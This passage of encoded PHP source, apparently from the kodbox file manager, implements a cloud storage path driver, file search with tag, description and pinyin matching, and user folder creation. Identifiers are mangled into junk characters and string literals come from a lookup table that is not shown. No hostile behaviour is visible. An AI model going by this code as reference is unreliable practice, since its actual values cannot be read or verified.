$áí¥îÉ); } public function setModifyTime($Ş¾¾‚øö, $öîÂ¹« = '') { @touch($Ş¾¾‚øö, intval($öîÂ¹«)); } public function download($“üÂâ‹ó, $áßõ®ª˜) { return $this->iconvSystem($“üÂâ‹ó); } } class PathDriverOBS extends PathDriverBaseS3 { public function __construct($€«—ÄÅç) { parent::__construct($€«—ÄÅç); $this->setSignVersion($_SERVER[áäÒ½¯Ç][258]); } public function fileOutImage($Œ”ĞÇ®, $é¬èÇó¹ = 250) { $êë™«Õ =& $_SERVER[áäÒ½¯Ç]; if ($this->size($Œ”ĞÇ®) > 1024 * 1024 * 25) { return $this->fileOutImageServer($Œ”ĞÇ®, $é¬èÇó¹); } $éíÊÕ­ = array($êë™«Õ[1616] => $êë™«Õ[1617] . $é¬èÇó¹ . $êë™«Õ[1618]); $œÃĞÈŸÁ = $this->link($Œ”ĞÇ®, $éíÊÕ­); $this->fileOutLink($œÃĞÈŸÁ); } } goto e—–»ÀŒ›; Aƒ÷´ä·»ê: class SourceListSearchModel extends SourceListMoveModel { public static function fileTypeWhere($ÏöÚÅ¢í) { $¦áãµ‘™ =& $_SERVER[áäÒ½¯Ç]; $ÅäÃ…Œ– = KodIO::fileTypeList(); $¼ªÌ§ãÓ = $ÅäÃ…Œ–[$ÏöÚÅ¢í]; if (!$¼ªÌ§ãÓ) { return array(); } $¹è‰ÑÔ´ = $¼ªÌ§ãÓ[$¦áãµ‘™[167]]; $´ÍúÖ§™ = $¦áãµ‘™[7]; if (!$¼ªÌ§ãÓ[$¦áãµ‘™[167]]) { $óõİõ¬ = array_to_keyvalue($ÅäÃ…Œ–, $¦áãµ‘™[12], $¦áãµ‘™[167]); $¹è‰ÑÔ´ = implode($¦áãµ‘™[50], $óõİõ¬); $´ÍúÖ§™ = $¦áãµ‘™[2397]; } $òû•İºÓ = explode($¦áãµ‘™[50], trim($¹è‰ÑÔ´, $¦áãµ‘™[50])); return array($´ÍúÖ§™, $òû•İºÓ); } public function listPathType($ø´ªúÒ) { $Ë€ƒïøÒ =& $_SERVER[áäÒ½¯Ç]; $­…¨†¼… = $this->fileTypeWhere($ø´ªúÒ); if (!$­…¨†¼…) { return array(); } $ú‚§´àÎ = USER_ID; $ûÔĞƒ»„ = Model($Ë€ƒïøÒ[622])->getInfo($ú‚§´àÎ); $ùÂÏŸ±’ = array($Ë€ƒïøÒ[676] => SourceModel::TYPE_USER, $Ë€ƒïøÒ[609] => array($Ë€ƒïøÒ[640], $Ë€ƒïøÒ[618] . $ûÔĞƒ»„[$Ë€ƒïøÒ[90]][$Ë€ƒïøÒ[192]] . $Ë€ƒïøÒ[641]), $Ë€ƒïøÒ[677] => $ú‚§´àÎ, $Ë€ƒïøÒ[674] => 0, $Ë€ƒïøÒ[675] => $­…¨†¼…); return $this->listSource($ùÂÏŸ±’); } public function listSearch($ç˜Ø·é˜, $Ğñ¨ø×é = 300) { $ÁÏ Û¯Õ =& $_SERVER[áäÒ½¯Ç]; if (isset($ç˜Ø·é˜[$ÁÏ Û¯Õ[2229]]) && $ç˜Ø·é˜[$ÁÏ Û¯Õ[2229]]) { $ç˜Ø·é˜[$ÁÏ Û¯Õ[2229]] = str_replace($ÁÏ Û¯Õ[480], $ÁÏ Û¯Õ[2398], trim($ç˜Ø·é˜[$ÁÏ Û¯Õ[2229]])); } $¶ûôÆñã = $this->_parseSearchWhere($ç˜Ø·é˜); if (!isset($¶ûôÆñã[$ÁÏ Û¯Õ[525]])) { $¶ûôÆñã[$ÁÏ Û¯Õ[525]] = 0; } $ü†úŠçæ = $ÁÏ Û¯Õ[2399]; $°„—Ÿ¡ = $¶ûôÆñã; $ÚÁßú–Ÿ = $ü†úŠçæ; $this->_listSearchBindPinyin($ç˜Ø·é˜, $¶ûôÆñã, $ü†úŠçæ); $this->alias($ÁÏ Û¯Õ[538])->_makeOrder(); $¶ûôÆñã = $this->parseWhereLike($¶ûôÆñã); $½ÕŸÆ¦ñ = $this->distinct(!0)->field($ü†úŠçæ)->where($¶ûôÆñã)->selectPage($Ğñ¨ø×é); if ($GLOBALS[$ÁÏ Û¯Õ[6]][$ÁÏ Û¯Õ[477]][$ÁÏ Û¯Õ[478]] && Input::check($ç˜Ø·é˜[$ÁÏ Û¯Õ[2229]], $ÁÏ Û¯Õ[683]) && $½ÕŸÆ¦ñ[$ÁÏ Û¯Õ[452]][$ÁÏ Û¯Õ[438]] == 1 && $½ÕŸÆ¦ñ[$ÁÏ Û¯Õ[452]][$ÁÏ Û¯Õ[453]] == 0) { $½ÕŸÆ¦ñ = $this->distinct(!0)->field($ü†úŠçæ)->where($°„—Ÿ¡)->limit(1000)->select(); $½ÕŸÆ¦ñ = array_page_split($½ÕŸÆ¦ñ, !1, $Ğñ¨ø×é); } $this->_listSearchFileContent($½ÕŸÆ¦ñ, $ç˜Ø·é˜, $ÚÁßú–Ÿ, $°„—Ÿ¡); $this->_listSearchDesc($½ÕŸÆ¦ñ, $ç˜Ø·é˜, $ÚÁßú–Ÿ); $this->_listSearchTag($½ÕŸÆ¦ñ, $ç˜Ø·é˜, $ÚÁßú–Ÿ); $this->_listSearchGroupTag($½ÕŸÆ¦ñ, $ç˜Ø·é˜, $ÚÁßú–Ÿ); $this->_listDataApply($½ÕŸÆ¦ñ[$ÁÏ Û¯Õ[455]]); $this->_listMake($½ÕŸÆ¦ñ); return $½ÕŸÆ¦ñ; } private function _listSearchFileContent(&$Ş¶¾õ, $ÎÀ®ˆ›ˆ, $Íñ—›ñÊ, $ûŞ¿Ø™µ) { $‰ïË¶Í¯ =& $_SERVER[áäÒ½¯Ç]; if (!$ÎÀ®ˆ›ˆ[$‰ïË¶Í¯[2229]] || $Ş¶¾õ[$‰ïË¶Í¯[452]][$‰ïË¶Í¯[438]] > 1) { return; } if (!isset($ûŞ¿Ø™µ[$‰ïË¶Í¯[32]]) || !is_array($ÎÀ®ˆ›ˆ[$‰ïË¶Í¯[562]])) { return; } $ûŞ¿Ø™µ[$‰ïË¶Í¯[562]] = array($‰ïË¶Í¯[7], $ÎÀ®ˆ›ˆ[$‰ïË¶Í¯[562]]); unset($ûŞ¿Ø™µ[$‰ïË¶Í¯[32]]); unset($ÎÀ®ˆ›ˆ[$‰ïË¶Í¯[562]]); $¿²×ëÔê = $this->field($Íñ—›ñÊ)->where($ûŞ¿Ø™µ)->limit($‰ïË¶Í¯[2400])->select(); if (!$¿²×ëÔê || count($¿²×ëÔê) == 0) { return; } $Ş¶¾õ[$‰ïË¶Í¯[455]] = array_merge($¿²×ëÔê, $Ş¶¾õ[$‰ïË¶Í¯[455]]); $Ş¶¾õ[$‰ïË¶Í¯[452]][$‰ïË¶Í¯[453]] += count($¿²×ëÔê); } private function _listSearchTag(&$ÏÌÍÈô, $õ™×ªº–, $Ÿ²ãûæş) { $²˜ Œ¬ =& $_SERVER[áäÒ½¯Ç]; if (empty($õ™×ªº–[$²˜ Œ¬[2095]]) || !in_array($²˜ Œ¬[2401], $õ™×ªº–[$²˜ Œ¬[2095]])) { return; } if (!$õ™×ªº–[$²˜ Œ¬[2229]] || $ÏÌÍÈô[$²˜ Œ¬[452]][$²˜ Œ¬[438]] > 1) { return; } $äª‘šù´ = Model($²˜ Œ¬[2402])->listData(); $ªÀ¾ø±‰ = array(); $Ğ™¥±›Õ = $õ™×ªº–[$²˜ Œ¬[2229]]; foreach ($äª‘šù´ as $Ê äß›¢) { $Å’â´ = $Ê äß›¢[$²˜ Œ¬[32]]; $ôÍŠ»Ä€ = str_replace($²˜ Œ¬[53], $²˜ Œ¬[12], Pinyin::get($Å’â´)); if (stripos($Å’â´, $Ğ™¥±›Õ) !== !1 || stripos($ôÍŠ»Ä€, $Ğ™¥±›Õ) !== !1) { $ªÀ¾ø±‰[] = $Ê äß›¢[$²˜ Œ¬[492]]; } } if (!$ªÀ¾ø±‰) { return; } $¼›á·†¼ = array($²˜ Œ¬[520] => array($²˜ Œ¬[7], $ªÀ¾ø±‰), $²˜ Œ¬[1542] => USER_ID); $›œè·‡® = Model($²˜ Œ¬[522])->field($²˜ Œ¬[87])->where($¼›á·†¼)->select(); $›œè·‡® = array_to_keyvalue($›œè·‡®, $²˜ Œ¬[12], $²˜ Œ¬[87]); $§üàĞ¬ø = array_unique($›œè·‡®); $this->_listSearchMerge($ÏÌÍÈô, $õ™×ªº–, $Ÿ²ãûæş, $§üàĞ¬ø); } private function _listSearchDesc(&$æµÚıó³, $ş¢â§…ğ, $¿¡¹Ğ‰ƒ) { $‘à‹Íæ­ =& $_SERVER[áäÒ½¯Ç]; if (empty($ş¢â§…ğ[$‘à‹Íæ­[2095]]) || !in_array($‘à‹Íæ­[545], $ş¢â§…ğ[$‘à‹Íæ­[2095]])) { return; } if (!$ş¢â§…ğ[$‘à‹Íæ­[2229]] || $æµÚıó³[$‘à‹Íæ­[452]][$‘à‹Íæ­[438]] > 1) { return; } $Šš§ÜÈ = array($‘à‹Íæ­[95] => $‘à‹Íæ­[545], $‘à‹Íæ­[460] => array($‘à‹Íæ­[479], $‘à‹Íæ­[2231] . $ş¢â§…ğ[$‘à‹Íæ­[2229]] . $‘à‹Íæ­[2231])); $®‹¦¹¾ñ = !1; if ($®‹¦¹¾ñ) { $–Ø†Ÿ£ = $this->listSearchChildren($ş¢â§…ğ[$‘à‹Íæ­[191]]); $–Ø†Ÿ£ = array_unique($–Ø†Ÿ£); if (!$–Ø†Ÿ£) { return; } $Šš§ÜÈ[$‘à‹Íæ­[192]] = array($‘à‹Íæ­[7], $–Ø†Ÿ£); } $…â †ŸÂ = Model($‘à‹Íæ­[660])->field($‘à‹Íæ­[192])->where($Šš§ÜÈ)->limit(5000)->select(); $¦¶èİ€ã = array_to_keyvalue($…â †ŸÂ, $‘à‹Íæ­[12], $‘à‹Íæ­[192]); $this->_listSearchMerge($æµÚıó³, $ş¢â§…ğ, $¿¡¹Ğ‰ƒ, $¦¶èİ€ã); } private function _listSearchGroupTag(&$·øø‰¦ , $çáŞ ±®, $éïºŠ‹) { $—òÊœ• =& $_SERVER[áäÒ½¯Ç]; if (empty($çáŞ ±®[$—òÊœ•[2095]]) || !in_array($—òÊœ•[2401], $çáŞ ±®[$—òÊœ•[2095]])) { return; } if (!$çáŞ ±®[$—òÊœ•[2229]] || $·øø‰¦ [$—òÊœ•[452]][$—òÊœ•[438]] > 1 || !$çáŞ ±®[$—òÊœ•[191]]) { return; } $·‰É¸Æ” = $this->sourceInfo($çáŞ ±®[$—òÊœ•[191]]); if (!$·‰É¸Æ” || $·‰É¸Æ”[$—òÊœ•[189]] != SourceModel::TYPE_GROUP) { return; } $»Â©ÉÉä = $·‰É¸Æ”[$—òÊœ•[594]]; $’÷àûÎ = Model($—òÊœ•[2403])->get($»Â©ÉÉä); $¦çüÚƒò = array(); $×ë­éÒí = $çáŞ ±®[$—òÊœ•[2229]]; foreach ($’÷àûÎ[$—òÊœ•[455]] as $–ã¬œĞ¸) { $ÀëÀÊ†Ğ = $–ã¬œĞ¸[$—òÊœ•[32]]; $Ç¥³ö¨Œ = str_replace($—òÊœ•[53], $—òÊœ•[12], Pinyin::get($ÀëÀÊ†Ğ)); if (stripos($ÀëÀÊ†Ğ, $×ë­éÒí) !== !1 || stripos($Ç¥³ö¨Œ, $×ë­éÒí) !== !1) { $¦çüÚƒò[] = $–ã¬œĞ¸[$—òÊœ•[492]]; } } if (!$¦çüÚƒò) { return; } $éğÅÅß¦ = array($—òÊœ•[520] => array($—òÊœ•[7], $¦çüÚƒò), $—òÊœ•[1542] => 0, $—òÊœ•[33] => $—òÊœ•[1440] . $»Â©ÉÉä); $æËŠÅÍÂ = Model($—òÊœ•[522])->field($—òÊœ•[87])->where($éğÅÅß¦)->select(); $æËŠÅÍÂ = array_to_keyvalue($æËŠÅÍÂ, $—òÊœ•[12], $—òÊœ•[87]); $–€£‡¤ = array_unique($æËŠÅÍÂ); $this->_listSearchMerge($·øø‰¦ , $çáŞ ±®, $éïºŠ‹, $–€£‡¤); } private function _listSearchMerge(&$„é¿âº², $Úö»¡õ„, $½ˆê¤æô, $›—¯ò³×) { $Ÿ¨ïˆ‚ =& $_SERVER[áäÒ½¯Ç]; if (!$›—¯ò³×) { return; } $º‹Ÿˆ–ó = array_to_keyvalue($„é¿âº²[$Ÿ¨ïˆ‚[455]], $Ÿ¨ïˆ‚[12], $Ÿ¨ïˆ‚[192]); $¬Æ·ÇÅÜ = array_diff($›—¯ò³×, $º‹Ÿˆ–ó); if (!$¬Æ·ÇÅÜ) { return; } $”¦£—°¾ = array($Ÿ¨ïˆ‚[192] => array($Ÿ¨ïˆ‚[7], $¬Æ·ÇÅÜ)); $«¨£æ™‹ = $this->field($½ˆê¤æô)->where($”¦£—°¾)->select(); if (!$«¨£æ™‹) { return; } $Ê¥‚²ã¡ = array(); foreach ($«¨£æ™‹ as $Œ×èı±÷) { if ($this->_listSearchFilter($Œ×èı±÷, $Úö»¡õ„)) { $Ê¥‚²ã¡[] = $Œ×èı±÷; } } $„é¿âº²[$Ÿ¨ïˆ‚[455]] = array_merge($Ê¥‚²ã¡, $„é¿âº²[$Ÿ¨ïˆ‚[455]]); $„é¿âº²[$Ÿ¨ïˆ‚[452]][$Ÿ¨ïˆ‚[453]] += count($Ê¥‚²ã¡); } private function _listSearchFilter($»ıÛ¥Â¶, $œü¯Ÿ°İ) { $…ö¼Ûœ­ =& $_SERVER[áäÒ½¯Ç]; $ğ†¼ûáˆ = $»ıÛ¥Â¶[$…ö¼Ûœ­[505]] == $…ö¼Ûœ­[91]; if (!strstr($»ıÛ¥Â¶[$…ö¼Ûœ­[609]], $…ö¼Ûœ­[50] . $œü¯Ÿ°İ[$…ö¼Ûœ­[191]] . $…ö¼Ûœ­[50])) { return !1; } if (isset($œü¯Ÿ°İ[$…ö¼Ûœ­[506]]) && $œü¯Ÿ°İ[$…ö¼Ûœ­[506]] != $…ö¼Ûœ­[881]) { if ($œü¯Ÿ°İ[$…ö¼Ûœ­[506]] == $…ö¼Ûœ­[78] && !$ğ†¼ûáˆ) { return !1; } if ($œü¯Ÿ°İ[$…ö¼Ûœ­[506]] != $…ö¼Ûœ­[78] && $ğ†¼ûáˆ) { return !1; } if (!strstr($»ıÛ¥Â¶[$…ö¼Ûœ­[167]], $…ö¼Ûœ­[50] . $œü¯Ÿ°İ[$…ö¼Ûœ­[506]] . $…ö¼Ûœ­[50])) { return !1; } } if (isset($œü¯Ÿ°İ[$…ö¼Ûœ­[2404]]) && $œü¯Ÿ°İ[$…ö¼Ûœ­[2404]] < $»ıÛ¥Â¶[$…ö¼Ûœ­[79]]) { return !1; } if (isset($œü¯Ÿ°İ[$…ö¼Ûœ­[2405]]) && $œü¯Ÿ°İ[$…ö¼Ûœ­[2405]] > $»ıÛ¥Â¶[$…ö¼Ûœ­[79]]) { return !1; } if (isset($œü¯Ÿ°İ[$…ö¼Ûœ­[690]]) && $œü¯Ÿ°İ[$…ö¼Ûœ­[690]] != $»ıÛ¥Â¶[$…ö¼Ûœ­[548]]) { return !1; } return !0; } public function listSearchChildren($÷™Ç¨ãû, $°ë¦Ğú’ = 5000) { $÷§ü¹æî =& $_SERVER[áäÒ½¯Ç]; $ÒĞâÛ÷” = array(); $Ü¦Î°å‹ = $this->sourceInfo($÷™Ç¨ãû); $Ûöë¢œÓ = array($÷§ü¹æî[609] => array($÷§ü¹æî[479], $Ü¦Î°å‹[$÷§ü¹æî[609]] . $Ü¦Î°å‹[$÷§ü¹æî[192]] . $÷§ü¹æî[641])); $ı¥‚î·º = $this->field($÷§ü¹æî[79])->where($Ûöë¢œÓ)->limit($°ë¦Ğú’ + 1)->select(); $ØùÇë … = is_array($ı¥‚î·º) ? count($ı¥‚î·º) : 0; if ($ØùÇë … > $°ë¦Ğú’) { return $this->_listSearchChildrenNear($÷™Ç¨ãû, $°ë¦Ğú’); } $¹ƒ¢†š„ = $this->field($÷§ü¹æî[192])->where($Ûöë¢œÓ)->select(); $ÒĞâÛ÷” = array_to_keyvalue($¹ƒ¢†š„, $÷§ü¹æî[12], $÷§ü¹æî[192]); return $ÒĞâÛ÷”; } private function _listSearchChildrenNear($¬Ò®´Á, $”˜ØÀÌú) { $Š”öì§‡ =& $_SERVER[áäÒ½¯Ç]; $ÇÂ‡ÉÒ = array(); $ºùî¦­ = array($Š”öì§‡[191] => $¬Ò®´Á); $õú¥ª‰ğ = $this->field($Š”öì§‡[2406])->where($ºùî¦­)->select(); $¬Æ©ƒûˆ = array_to_keyvalue(array_filter_by_field($õú¥ª‰ğ, $Š”öì§‡[505], $Š”öì§‡[91]), $Š”öì§‡[12], $Š”öì§‡[192]); $ÇÂ‡ÉÒ = array_merge($ÇÂ‡ÉÒ, array_to_keyvalue($õú¥ª‰ğ, $Š”öì§‡[12], $Š”öì§‡[192])); if (!$¬Æ©ƒûˆ) { return $ÇÂ‡ÉÒ; } $ºùî¦­ = array($Š”öì§‡[191] => array($Š”öì§‡[7], $¬Æ©ƒûˆ)); $õú¥ª‰ğ = $this->field($Š”öì§‡[2406])->where($ºùî¦­)->limit($”˜ØÀÌú)->select(); $ÇÂ‡ÉÒ = array_merge($ÇÂ‡ÉÒ, array_to_keyvalue($õú¥ª‰ğ, $Š”öì§‡[12], $Š”öì§‡[192])); $ÇÂ‡ÉÒ = array_slice($ÇÂ‡ÉÒ, 0, intval($”˜ØÀÌú)); return $ÇÂ‡ÉÒ; } private function _listSearchBindPinyin($ô¨âÕ¯…, &$Óşû¨ëš, &$Öíúöá²) { $ãµ¡ìÌÚ =& $_SERVER[áäÒ½¯Ç]; if (!isset($ô¨âÕ¯…[$ãµ¡ìÌÚ[2229]]) || !$ô¨âÕ¯…[$ãµ¡ìÌÚ[2229]]) { return; } if (!Input::check($ô¨âÕ¯…[$ãµ¡ìÌÚ[2229]], $ãµ¡ìÌÚ[403]) || strlen($ô¨âÕ¯…[$ãµ¡ìÌÚ[2229]]) < 2) { return; } $®ôŠ“ª¾ = "\x4c\x45\x46\124\40\112\117\111\x4e\x20{$this->tablePrefix}\x69\x6f\x5f\x73\x6f\x75\x72\x63\x65\137\x6d\x65\x74\141\40\x6d\145\164\141\x20\157\156\x20\x73\157\165\162\143\x65\x2e\x73\x6f\x75\x72\x63\145\x49\104\40\75\x20\x6d\x65\164\141\x2e\163\157\165\162\143\145\x49\x44"; $ŞÓ…‰÷ = array(); $Öíúöá² = str_replace(array($ãµ¡ìÌÚ[221], $ãµ¡ìÌÚ[53], $ãµ¡ìÌÚ[2407]), $ãµ¡ìÌÚ[12], $Öíúöá²); $Öíúöá² = $ãµ¡ìÌÚ[530] . str_replace($ãµ¡ìÌÚ[50], $ãµ¡ìÌÚ[531], $Öíúöá²); $öÊĞ•® = $Óşû¨ëš[$ãµ¡ìÌÚ[32]]; unset($Óşû¨ëš[$ãµ¡ìÌÚ[32]]); foreach ($Óşû¨ëš as $·ÙÒö°« => $òÓÛ¾õ¤) { $ŞÓ…‰÷[$ãµ¡ìÌÚ[530] . $·ÙÒö°«] = $òÓÛ¾õ¤; } foreach ($öÊĞ•® as $Ğ‚óôÃ¯) { $ŞÓ…‰÷[] = array($ãµ¡ìÌÚ[535] => $Ğ‚óôÃ¯, $ãµ¡ìÌÚ[1116] => $ãµ¡ìÌÚ[2233], array($ãµ¡ìÌÚ[2408] => $Ğ‚óôÃ¯, $ãµ¡ìÌÚ[2409] => array($ãµ¡ìÌÚ[7], array($ãµ¡ìÌÚ[557], $ãµ¡ìÌÚ[556])))); } $this->join($®ôŠ“ª¾); $Óşû¨ëš = $ŞÓ…‰÷; } private function _parseSearchWhere($‹î´æ­ö) { $¥Ñ¬œõø =& $_SERVER[áäÒ½¯Ç]; $Í¬ ’·Î = array(); if (isset($‹î´æ­ö[$¥Ñ¬œõø[863]]) && $‹î´æ­ö[$¥Ñ¬œõø[863]]) { $Í¬ ’·Î[$¥Ñ¬œõø[88]] = array($¥Ñ¬œõø[2410], $‹î´æ­ö[$¥Ñ¬œõø[863]]); } if (isset($‹î´æ­ö[$¥Ñ¬œõø[864]]) && $‹î´æ­ö[$¥Ñ¬œõø[864]]) { $Éº×ëË— = array($¥Ñ¬œõø[2411], $‹î´æ­ö[$¥Ñ¬œõø[864]]); if ($Í¬ ’·Î[$¥Ñ¬œõø[88]]) { $Í¬ ’·Î[$¥Ñ¬œõø[88]] = array($Í¬ ’·Î[$¥Ñ¬œõø[88]], $Éº×ëË—, $¥Ñ¬œõø[2412]); } else { $Í¬ ’·Î[$¥Ñ¬œõø[88]] = $Éº×ëË—; } } if (isset($‹î´æ­ö[$¥Ñ¬œõø[2404]]) && $‹î´æ­ö[$¥Ñ¬œõø[2404]] > 0) { $Í¬ ’·Î[$¥Ñ¬œõø[79]] = array($¥Ñ¬œõø[2410], $‹î´æ­ö[$¥Ñ¬œõø[2404]]); } if (isset($‹î´æ­ö[$¥Ñ¬œõø[2405]]) && $‹î´æ­ö[$¥Ñ¬œõø[2405]]) { $Éº×ëË— = array($¥Ñ¬œõø[2411], $‹î´æ­ö[$¥Ñ¬œõø[2405]]); if ($Í¬ ’·Î[$¥Ñ¬œõø[79]]) { $Í¬ ’·Î[$¥Ñ¬œõø[79]] = array($Í¬ ’·Î[$¥Ñ¬œõø[79]], $Éº×ëË—, $¥Ñ¬œõø[2412]); } else { $Í¬ ’·Î[$¥Ñ¬œõø[79]] = $Éº×ëË—; } } if (isset($‹î´æ­ö[$¥Ñ¬œõø[690]]) && $‹î´æ­ö[$¥Ñ¬œõø[690]]) { $Í¬ ’·Î[] = array($¥Ñ¬œõø[548] => $‹î´æ­ö[$¥Ñ¬œõø[690]], $¥Ñ¬œõø[546] => $‹î´æ­ö[$¥Ñ¬œõø[690]], $¥Ñ¬œõø[1116] => $¥Ñ¬œõø[2233]); } if (isset($‹î´æ­ö[$¥Ñ¬œõø[506]]) && $‹î´æ­ö[$¥Ñ¬œõø[506]]) { $í„à¸˜ü = $‹î´æ­ö[$¥Ñ¬œõø[506]]; if ($í„à¸˜ü == $¥Ñ¬œõø[78]) { $Í¬ ’·Î[$¥Ñ¬œõø[505]] = 1; } else { if ($í„à¸˜ü == $¥Ñ¬œõø[2413]) { $Í¬ ’·Î[$¥Ñ¬œõø[505]] = 0; } else { if ($í„à¸˜ü) { $í„à¸˜ü = is_array($í„à¸˜ü) ? $í„à¸˜ü : explode($¥Ñ¬œõø[50], $í„à¸˜ü); $Í¬ ’·Î[$¥Ñ¬œõø[506]] = array($¥Ñ¬œõø[512], $í„à¸˜ü); $Í¬ ’·Î[$¥Ñ¬œõø[505]] = 0; } } } } $this->_parseSearchParent($‹î´æ­ö, $Í¬ ’·Î); if (isset($‹î´æ­ö[$¥Ñ¬œõø[2229]]) && trim($‹î´æ­ö[$¥Ñ¬œõø[2229]])) { $ûó’ÖÅœ = trim($‹î´æ­ö[$¥Ñ¬œõø[2229]]); $¬ğÛé¿÷ = explode($¥Ñ¬œõø[53], $ûó’ÖÅœ); if (strlen($ûó’ÖÅœ) > 2 && (substr($ûó’ÖÅœ, 0, 1) == $¥Ñ¬œõø[119] && substr($ûó’ÖÅœ, -1) == $¥Ñ¬œõø[119]) || substr($ûó’ÖÅœ, 0, 1) == $¥Ñ¬œõø[58] && substr($ûó’ÖÅœ, -1) == $¥Ñ¬œõø[58]) { $ûó’ÖÅœ = substr($ûó’ÖÅœ, 1, -1); $¬ğÛé¿÷ = array($ûó’ÖÅœ); } $Í¬ ’·Î[$¥Ñ¬œõø[32]] = array(array($¥Ñ¬œõø[640], $¥Ñ¬œõø[2231] . $ûó’ÖÅœ . $¥Ñ¬œõø[2231])); if (count($¬ğÛé¿÷) > 1) { $Í¬ ’·Î[$¥Ñ¬œõø[32]] = array(); foreach ($¬ğÛé¿÷ as $ÜÒ¾µ–) { if (!trim($ÜÒ¾µ–)) { continue; } $Í¬ ’·Î[$¥Ñ¬œõø[32]][] = array($¥Ñ¬œõø[640], $¥Ñ¬œõø[2231] . trim($ÜÒ¾µ–) . $¥Ñ¬œõø[2231]); } } } return $Í¬ ’·Î; } private function _parseSearchParent($Úïâš¢ı, &$ıØƒ…Àù) { $ó®Ï =& $_SERVER[áäÒ½¯Ç]; if (!isset($Úïâš¢ı[$ó®Ï[191]]) || !$Úïâš¢ı[$ó®Ï[191]]) { return; } $Œ¬ó®Ì© = $this->pathInfo($Úïâš¢ı[$ó®Ï[191]]); $ßñÚ¨¡¢ = $Œ¬ó®Ì©[$ó®Ï[191]] . $ó®Ï[12] === $ó®Ï[239]; $¶©€ë½“ = $Œ¬ó®Ì©[$ó®Ï[189]] == $ó®Ï[603]; if ($Œ¬ó®Ì©[$ó®Ï[619]] == $ó®Ï[620]) { $¶•²»×§ = $this->sourceInfo($Úïâš¢ı[$ó®Ï[191]]); $Œ¬ó®Ì©[$ó®Ï[609]] = $¶•²»×§[$ó®Ï[609]]; } $ıØƒ…Àù[$ó®Ï[680]] = array($ó®Ï[640], $Œ¬ó®Ì©[$ó®Ï[609]] . $Úïâš¢ı[$ó®Ï[191]] . $ó®Ï[641]); $¥Æ™Ş²‡ = isset($Úïâš¢ı[$ó®Ï[2095]]) && in_array($ó®Ï[603], $Úïâš¢ı[$ó®Ï[2095]]); if (!$¥Æ™Ş²‡ || !$¶©€ë½“ || !$ßñÚ¨¡¢ || !$Œ¬ó®Ì©[$ó®Ï[507]]) { return; } if (!AuthModel::authCheckRoot($Œ¬ó®Ì©[$ó®Ï[507]][$ó®Ï[508]])) { return; } $”³Ñ»Ñ = $Œ¬ó®Ì©[$ó®Ï[594]] . $ó®Ï[12]; if ($”³Ñ»Ñ == $ó®Ï[91]) { unset($ıØƒ…Àù[$ó®Ï[680]]); $ıØƒ…Àù[$ó®Ï[189]] = self::TYPE_GROUP; return; } $»Å¤¨—Ç = Model($ó®Ï[610])->groupChildrenAll($”³Ñ»Ñ); $¿¡ÑÃ¿Å = count($»Å¤¨—Ç); if ($¿¡ÑÃ¿Å <= 1) { return; } $±£ıÂŸ = array($ó®Ï[191] => 0, $ó®Ï[189] => self::TYPE_GROUP, $ó®Ï[594] => array($ó®Ï[7], $»Å¤¨—Ç)); $úà¸›È½ = $this->field($ó®Ï[2414])->where($±£ıÂŸ)->limit($¿¡ÑÃ¿Å)->select(); $ıØƒ…Àù[$ó®Ï[680]] = array(); foreach ($úà¸›È½ as $‰Ğ÷ÛêĞ) { $ıØƒ…Àù[$ó®Ï[680]][] = array($ó®Ï[640], $ó®Ï[618] . $‰Ğ÷ÛêĞ[$ó®Ï[192]] . $ó®Ï[641]); } $ıØƒ…Àù[$ó®Ï[680]][] = $ó®Ï[2233]; } } class SourceModel extends SourceListSearchModel { public $statusIgnoreResetSpace = false; public function userRootAdd($Ğœç—) { $¸ì„¥Ï =& $_SERVER[áäÒ½¯Ç]; $Éìµ³çä = Model($¸ì„¥Ï[602])->where(array($¸ì„¥Ï[1918] => $Ğœç—))->find(); $¼Ö÷ÁÆ = $this->_mkdirRoot(SourceModel::TYPE_USER, $Ğœç—, $Éìµ³çä[$¸ì„¥Ï[32]]); $this->userDesktopAdd($¼Ö÷ÁÆ); return $¼Ö÷ÁÆ; } public function userDesktopAdd($Îò‡àµ) { $¦ãëëà =& $_SERVER[áäÒ½¯Ç]; $°ÙıƒÍ = LNG($¦ãëëà[2415]); $•Şø¤…Ò = $this->mkdir($Îò‡àµ, $°ÙıƒÍ); $this->metaSet($•Şø¤…Ò, $¦ãëëà[2416], $¦ãëëà[91]); $this->metaSet($Îò‡àµ, $¦ãëëà[2417], $•Şø¤…Ò); } public function userPathSafeAdd($‡ÚÇãŸó) { $ÔÁá‚œõ =& $_SERVER[áäÒ½¯Ç]; $îÔ†åè‹ = Model($ÔÁá‚œõ[602])->getInfoFull($‡ÚÇãŸó); if (!$îÔ†åè‹) { return !1; } if (_get($îÔ†åè‹, $ÔÁá‚œõ[623])) { return $îÔ†åè‹[$ÔÁá‚œõ[560]][$ÔÁá‚œõ[2418]]; } $şæÔÖõè = $this->_mkdirRoot(SourceModel::TYPE_USER, $‡ÚÇãŸó, $ÔÁá‚œõ[2419], $ÔÁá‚œõ[2420]); Model($ÔÁá‚œõ[602])->metaSet($‡ÚÇãŸó, $ÔÁá‚œõ[2418], $şæÔÖõè); $this->metaSet($şæÔÖõè, $ÔÁá‚œõ[2421], $‡ÚÇãŸó); return $şæÔÖõè; } public function userPathAppAdd($Ü¦ìˆ¡ğ, $³—¯ÛŒÒ = '', $‰‰²Å¨ß = '') { $à¨š§ß =& $_SERVER[áäÒ½¯Ç]; $‘šã³ş¾ = Model($à¨š§ß[602])->getInfoFull($Ü¦ìˆ¡ğ); if (!$‘šã³ş¾) { return !1; } $êÃ€äÒ = $‘šã³ş¾[$à¨š§ß[560]] ? $‘šã³ş¾[$à¨š§ß[560]] : array(); $¯ªÍ«™× = $êÃ€äÒ[$à¨š§ß[2422]]; if (!$¯ªÍ«™×) { $¯ªÍ«™× = $this->_mkdirRoot(SourceModel::TYPE_USER, $Ü¦ìˆ¡ğ, $à¨š§ß[2423], $à¨š§ß[2424]); Model($à¨š§ß[602])->metaSet($Ü¦ìˆ¡ğ, $à¨š§ß[2422], $¯ªÍ«™× . $à¨š§ß[12]); $this->metaSet($¯ªÍ«™×, $à¨š§ß[2422], $Ü¦ìˆ¡ğ); } if (!$³—¯ÛŒÒ) { return $¯ªÍ«™×; } $Š©¢·Ê¸ = $êÃ€äÒ[$à¨š§ß[2425] . $³—¯ÛŒÒ]; if (!$Š©¢·Ê¸) { $Š©¢·Ê¸ = $this->mkdir($¯ªÍ«™×, $³—¯ÛŒÒ); Model($à¨š§ß[602])->metaSet($Ü¦ìˆ¡ğ, $à¨š§ß[2425] . $³—¯ÛŒÒ, $Š©¢·Ê¸); $this->metaSet($Š©¢·Ê¸, $à¨š§ß[2425] 